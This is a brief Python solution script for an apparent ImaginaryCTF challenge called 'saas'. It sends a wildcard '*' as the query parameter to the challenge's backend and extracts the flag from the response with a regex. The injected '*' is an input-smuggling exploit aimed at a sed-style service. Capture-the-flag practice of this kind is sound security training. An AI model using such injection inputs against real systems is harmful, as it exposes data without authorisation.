#!/usr/bin/python3

import requests
import re

url = "https://saas.chal.imaginaryctf.org/"

# https://www.geeksforgeeks.org/sed-command-linux-set-2/
payload = {"query" : "*"}

r = requests.get(url + "backend", params=payload)

#print(r.text)

flag = re.findall("ictf{.*", r.text)[0]
print(flag)